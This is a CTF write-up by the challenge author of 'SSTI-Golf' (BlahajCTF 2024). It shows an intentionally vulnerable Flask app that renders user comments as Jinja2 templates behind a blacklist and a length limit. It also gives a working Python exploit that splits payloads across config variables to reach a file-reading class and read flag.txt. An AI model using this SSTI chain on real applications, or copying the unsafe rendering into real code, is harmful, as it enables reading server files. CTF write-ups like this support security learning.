---
title: SSTI-Golf
date: 2024-11-26
tags: 
- web
- author-fs
categories: BlahajCTF 2024
---

by {% person fs %}

> I got bored of code-golfing so I decided to come up with ssti-golfing.

This challenge was hosted on http://golf.c1.blahaj.sg/.

![](../../static/BlahajCTF2024/golf.png)

This challenge was a classic Jinja2 SSTI challenge but with a (pretty strict) length restriction challenge implemented. Looking at the source code below, it's quite short and not much to really digest.

```py
from flask import Flask, request, render_template, render_template_string
from waitress import serve
import flask
import os
import time

app = Flask(__name__)
app.secret_key=os.urandom(32)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/greet", methods=["POST"])
def greet():
    blacklist=['cycler','joiner','namespace','lipsum','globals','builtins','request']
    comment=request.form.get("comment")
    if len(comment)>65:
        return render_template("index.html",comment="That's kinda too much for a comment.")
    for i in blacklist:
        if i in comment.lower():
            print('builtins' in comment)
            return render_template("index.html",comment="I don't really like your comment. >:( ")
    return render_template_string(f"Damn. You like {comment}?")

if __name__ == "__main__":
    print(flask.__version__)
    serve(app,host="0.0.0.0",port=8000)

```

The ```render_template_string()``` function directly injects the user supplied data (the comment parameter) into the f-string before rendering it which makes this web app vulnerable to SSTI. However, we see that it checks if the length of the user supplied data exceeds 65 characters (this was a mistake in the source code since it was intended to be 40 but i had deployed this challenge with the restriction being 65 characters so this challenge became significantly more easier (unintended)) and it also blocks a few terms (the blacklist) that can make the SSTI payload extremely short.

However, we can easily get around this restriction by breaking apart our ssti payload into several pieces and storing them into flask config variables since this web app doesn't block using config variables. So you could store ```''.__class__.__mro__[1].__subclassess__``` into a config variable by running ```{{config.update({'u':'ssti-payload'})}}```. Using this method, we can store a payload to read flag.txt such as ```''.__class__.__mro[1].__subclassess__[357]("flag.txt").read()``` which is using LazyFile class to read flag.txt into the following config variables.

```py
import requests
payloads = [
    '{{config.update({"u":config.update})}}', #we are storing the config.update() method into a config variable itself to minimise characters 
    '{{config.u({"a":"".__class__.mro()})}}', #the next few lines just breaks up the payload into multiple parts and stores them into config vars
    '{{config.u({"b":"__subclasses__"})}}',
    '{{config.u({"c":config.a[1]})}}',
    '{{config.u({"d":config.c[config.b]})}}',
    '{{config.u({"e":config.d()[390]})}}',
    "{{config.e('flag.txt').read()}}" ## calling read() on the initialised LazyFile class
]

for i in payloads:
    resp=requests.post("http://127.0.0.1:8000/greet",data={"comment":i})
    print(resp.content)
```

By running this, we get the flag ```blahaj{c0nf1g_v4r14bl35_f7w}```. 

